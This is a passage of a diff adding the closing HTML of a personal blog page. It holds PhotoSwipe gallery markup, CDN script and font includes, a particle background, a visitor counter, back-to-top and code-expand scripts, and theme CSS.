+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    function backToTop() {
+      document.documentElement.scrollIntoView({
+        behavior: 'smooth',
+      })
+    }
+  
+    window.onload = function () {
+      let scrollTop =
+        this.document.documentElement.scrollTop || this.document.body.scrollTop
+      let totopBtn = this.document.getElementById('back-to-top')
+      if (scrollTop > 0) {
+        totopBtn.style.display = 'inline'
+      } else {
+        totopBtn.style.display = 'none'
+      }
+    }
+  
+    window.onscroll = function () {
+      let scrollTop =
+        this.document.documentElement.scrollTop || this.document.body.scrollTop
+      let totopBtn = this.document.getElementById('back-to-top')
+      if (scrollTop < 200) {
+        totopBtn.style.display = 'none'
+      } else {
+        totopBtn.style.display = 'inline'
+        totopBtn.addEventListener('click', backToTop, false)
+      }
+    }
+  </script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<div id="particles-js"></div>
+<div id="jsi-flying-fish-container"></div>
+
+<style>
+    #particles-js {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -2;
+    }
+    #jsi-flying-fish-container {
+        width: 100%;
+        height: 200px;
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        z-index: -1;
+        opacity: 0.37;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    html, body {
+        position: relative;
+        min-height: 100%;
+    }  
+</style>
+
+<script src="/background/particles.min.js"></script>
+<script>
+  particlesJS.load('particles-js', '\/background\/particlesjs-config.json', function() {
+    console.log('particles.js loaded - callback');
+  });
+</script>
+<script src="/js/renderer.js"></script>
+
+
+<script>
+  if (typeof RENDERER !== 'undefined') {
+    RENDERER.init();
+  }
+</script>
+
+<style>
+    .highlight {
+         
+        max-height: 600px;
+        overflow: hidden;
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://th4uma.github.io/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+ 
+  initCodeMoreBox();
+</script>
+
+
+<style>
+@font-face {
+  font-family: 'songti';
+  src: url('/font/songti.ttf') format('opentype');
+}
+
+@font-face {
+  font-family: 'Ubuntu-R';
+  src: url('/font/Ubuntu-R.ttf') format('opentype');
+}
+
+:root {
+  --base-font-family: 'songti';
+  --code-font-family: 'Ubuntu-R';
+}
+
+body {
+  font-family: var(--base-font-family), sans-serif;
+  background: url(https://th4uma.github.io/background/bg.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+}
+</style>
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+
+<a href="#" id="back-to-top" title="返回顶部"></a>
+
+
+<style>
+  #back-to-top {
+    display: none;
+    position: fixed;
+    bottom: 5px;
+    right: 15px;
+    width: 40px;  
+    height: 40px;  
+    border-radius: 50%;  
+    background-color: #2b3947ab !important;
+    box-shadow: var(--shadow-l2);
+    font-size: 20px;  
+    text-align: center;
+    line-height: 38px;  
+    cursor: pointer;
+    transition:
+      transform 0.3s ease,
+      background-color 0.3s ease;  
+  }
+
+  #back-to-top:before {
+    content: "";
+    display: inline-block;
+    position: relative;
+    transform: rotate(135deg);
+    height: 8px;  
+    width: 8px;  
+    border-width: 0 0 2px 2px;
+    border-color: var(--back-to-top-color);
+    border-style: solid;
+  }
+
+  #back-to-top:hover {
+    transform: scale(1.1);  
+    background-color: var(--accent-background);  
+  }
+
+  #back-to-top:hover:before {
+    border-color: var(--accent-color);  
+  }
+
+   
+  @media screen and (max-width: 768px) {
+    #back-to-top {
+      bottom: 5px;
+      right: var(--container-padding);
+      width: 30px;  
+      height: 30px;
+      font-size: 16px;
+      line-height: 32px;
+    }
+  }
+
+  @media screen and (min-width: 1024px) {
+    #back-to-top {
+      bottom: 10px;
+      right: 20px;
+    }
+  }
+
+  @media screen and (min-width: 1280px) {
+    #back-to-top {
+      bottom: 15px;
+      right: 25px;
+    }
+  }
+
+  @media screen and (min-width: 1536px) {
+    #back-to-top {
+      bottom: 15px;
+      right: 25px;
+       
+    }
+  }
+</style>
+
+
+    </body>
+</html>
